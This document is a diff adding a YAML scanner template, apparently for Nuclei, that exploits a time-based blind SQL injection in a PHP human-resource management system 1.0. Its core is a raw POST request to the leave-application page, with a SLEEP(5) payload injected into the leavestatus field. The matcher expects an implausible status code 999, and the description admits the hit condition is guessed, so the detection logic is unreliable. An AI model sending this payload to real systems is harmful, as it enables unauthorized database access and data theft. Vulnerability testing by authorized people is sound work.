@@ -1,0 +1,66 @@
+id: poc-xbk1nox9m1393zdx
+info:
+  name: 人力资源管理系统1.0 SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xbk1nox9m1393zdx
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xbk1nox9m1393zdx
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /hrm/user/applyleave.php HTTP/1.1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+
+    Accept-Language: en-US
+
+
+    Accept-Encoding: gzip, deflate, br
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    Connection: close
+
+
+    Cookie: PHPSESSID=2v2v2al4dkd4iir9cl5j7oikvr
+
+
+    Upgrade-Insecure-Requests: 1
+
+
+    X-PwnFox-Color: cyan
+
+
+
+
+    leavestatus=5''+AND+(SELECT+1337+FROM+(SELECT(SLEEP(5)))VSgR)+AND+''Kha''%3d''123&reason=+++&startdate=03%2F04%2F2024&enddate=29%2F04%2F2024&Apply=Submit
+
+
+    # 响应代码特征
+
+    999
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 999 && duration >= 5
+    condition: and
